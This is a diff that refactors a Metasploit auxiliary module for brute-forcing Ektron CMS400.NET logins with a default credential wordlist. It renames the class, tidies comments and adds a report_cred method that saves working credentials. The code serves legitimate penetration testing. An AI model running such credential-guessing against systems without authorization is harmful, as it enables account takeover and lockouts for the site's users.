@@ -1,10 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Report
@@ -35,14 +34,14 @@ class Metasploit3 < Msf::Auxiliary
             "File containing users and passwords",
             File.join(Msf::Config.data_directory, "wordlists", "cms400net_default_userpass.txt")
           ])
-      ], self.class)
+      ])
 
-    # "Set to false to prevent account lockouts - it will!"
+    # Set to false to prevent account lockouts - it will!
     deregister_options('BLANK_PASSWORDS')
   end
 
   def target_url
-    #Function to display correct protocol and host/vhost info
+    # Function to display correct protocol and host/vhost info
     if rport == 443 or ssl
       proto = "https"
     else
@@ -74,8 +73,8 @@ class Metasploit3 < Msf::Auxiliary
         return
       end
 
-      #Check for HTTP 200 response.
-      #Numerous versions and configs make if difficult to further fingerprint.
+      # Check for HTTP 200 response.
+      # Numerous versions and configs make if difficult to further fingerprint.
       if (res and res.code == 200)
         print_status("Ektron CMS400.NET install found at #{target_url}  [HTTP 200]")
 
@@ -104,14 +103,14 @@ class Metasploit3 < Msf::Auxiliary
       end
 
     rescue
-      print_error ("Ektron CMS400.NET login page not found at #{target_url}  [HTTP #{res.code}]")
+      print_error("Ektron CMS400.NET login page not found at #{target_url}  [HTTP #{res.code}]")
       return
     end
   end
 
   def get_version
-      #Attempt to retrieve the version of CMS400.NET installed.
-      #Not always possible based on version/config.
+      # Attempt to retrieve the version of CMS400.NET installed.
+      # Not always possible based on version/config.
       payload = "http://#{vhost}:#{rport}/WorkArea/java/ektron.site-data.js.ashx"
       res = send_request_cgi(
       {
@@ -122,6 +121,33 @@ class Metasploit3 < Msf::Auxiliary
       if (res.body.match(/Version.:.(\d{1,3}.\d{1,3})/))
         print_status "Ektron CMS400.NET version: #{$1}"
       end
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def do_login(user=nil, pass=nil, viewstate_arg=viewstate, eventvalidation_arg=eventvalidation)
@@ -141,17 +167,7 @@ class Metasploit3 < Msf::Auxiliary
 
       if (res and res.code == 200 and res.body.to_s.match(/LoginSuceededPanel/i) != nil)
         print_good("#{target_url} [Ektron CMS400.NET] Successful login: '#{user}' : '#{pass}'")
-        report_auth_info(
-          :host         => rhost,
-          :port         => rport,
-          :sname => (ssl ? 'https' : 'http'),
-          :user         => user,
-          :pass         => pass,
-          :proof        => "WEBAPP=\"Ektron CMS400.NET\", VHOST=#{vhost}",
-          :source_type  => "user_supplied",
-          :duplicate_ok => true,
-          :active       => true
-        )
+        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
 
       elsif(res and res.code == 200)
         vprint_error("#{target_url} [Ekton CMS400.NET] - Failed login as: '#{user}'")
@@ -166,5 +182,4 @@ class Metasploit3 < Msf::Auxiliary
     end
 
   end
-
 end
